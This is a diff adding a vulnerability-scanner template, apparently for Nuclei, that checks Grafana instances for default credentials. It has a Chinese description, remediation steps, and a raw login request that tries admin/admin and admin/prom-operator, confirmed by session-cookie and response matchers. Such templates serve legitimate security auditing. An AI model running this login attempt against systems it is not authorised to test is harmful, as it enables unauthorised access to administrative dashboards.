@@ -1,0 +1,49 @@
+id: grafana-default-login
+info:
+  name: Grafana Default Login
+  author:
+  - l0ne1y
+  description: |-
+    Grafana 默认账号密码
+    Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。
+    Grafana存在默认账户密码，管理员在系统安装后未对账号密码进行安全修改。
+  severity: high
+  remediation: |-
+    1、配置所有的安全机制
+    2、最小原则，关掉或限制不使用的服务
+    3、更改默认账户信息
+    4、使用日志和警报
+    5、回显信息不显示任何与实际错误相关的信息
+    6、检查和修复安全配置项
+requests:
+- matchers:
+  - type: word
+    part: header
+    words:
+    - grafana_session
+  - type: word
+    part: body
+    words:
+    - Logged in
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /login HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Accept-Language: en-US,en;q=0.5
+    Referer: {{BaseURL}}
+    content-type: application/json
+
+    {"user":"{{username}}","password":"{{password}}"}
+  attack: pitchfork
+  payloads:
+    password:
+    - prom-operator
+    - admin
+    username:
+    - admin
+    - admin
